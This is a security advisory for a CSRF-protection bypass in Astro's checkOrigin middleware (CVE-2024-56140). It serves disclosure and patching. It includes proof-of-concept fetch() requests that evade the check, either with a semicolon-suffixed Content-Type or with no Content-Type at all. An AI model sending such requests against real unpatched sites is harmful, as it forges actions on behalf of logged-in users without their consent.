# [M] Atro CSRF Middleware Bypass (security.checkOrigin)

## Summary
Severity: Medium
Advisory: GHSA-c4pw-33h3-35xw
CVE: CVE-2024-56140
CWE: CWE-352
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2024-12-18
Source: https://github.com/advisories/GHSA-c4pw-33h3-35xw
Type: github-advisory

## Affected
- npm: `astro` — affected >=0 <4.16.17

## Details
### Summary

A bug in Astro’s CSRF-protection middleware allows requests to bypass CSRF checks.

### Details

When the `security.checkOrigin` configuration option is set to `true`, Astro middleware will perform a CSRF check. (Source code: https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts)

For example, with the following Astro configuration:

```js
// astro.config.mjs
import { defineConfig } from 'astro/config';
import node from '@astrojs/node';

export default defineConfig({
	output: 'server',
	security: { checkOrigin: true },
	adapter: node({ mode: 'standalone' }),
});
```

A request like the following would be blocked if made from a different origin:

```js
// fetch API or <form action="https://test.example.com/" method="POST">
fetch('https://test.example.com/', {
	method: 'POST',
	credentials: 'include',
	body: 'a=b',
	headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
});
// => Cross-site POST form submissions are forbidden
```

However, a vulnerability exists that can bypass this security.

#### Pattern 1: Requests with a semicolon after the `Content-Type`

A semicolon-delimited parameter is allowed after the type in `Content-Type`.

Web browsers will treat a `Content-Type` such as `application/x-www-form-urlencoded; abc` as a [simple request](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) and will not perform preflight validation. In this case, CSRF is not blocked as expected.

```js
fetch('https://test.example.com', {
	method: 'POST',
	credentials: 'include',
	body: 'test',
	headers: { 'Content-Type': 'application/x-www-form-urlencoded; abc' },
});
// => Server-side functions are executed (Response Code 200).
```

#### Pattern 2: Request without `Content-Type` header

The `Content-Type` header is not required for a request. The following examples are sent without a `Content-Type` header, resulting in CSRF.

```js
// Pattern 2.1 Request without body
fetch('http://test.example.com', { method: 'POST', credentials: 'include' });

// Pattern 2.2 Blob object without type
fetch('https://test.example.com', {
	method: 'POST',
	credentials: 'include',
	body: new Blob(['a=b'], {}),
});
```

### Impact

Bypass CSRF protection implemented with CSRF middleware.

> [!Note]
> Even with `credentials: 'include'`, browsers may not send cookies due to third-party cookie blocking. This feature depends on the browser version and settings, and is for privacy protection, not as a CSRF measure.

## References
- https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw
- https://nvd.nist.gov/vuln/detail/CVE-2024-56140
- https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests
- https://github.com/withastro/astro
- https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts
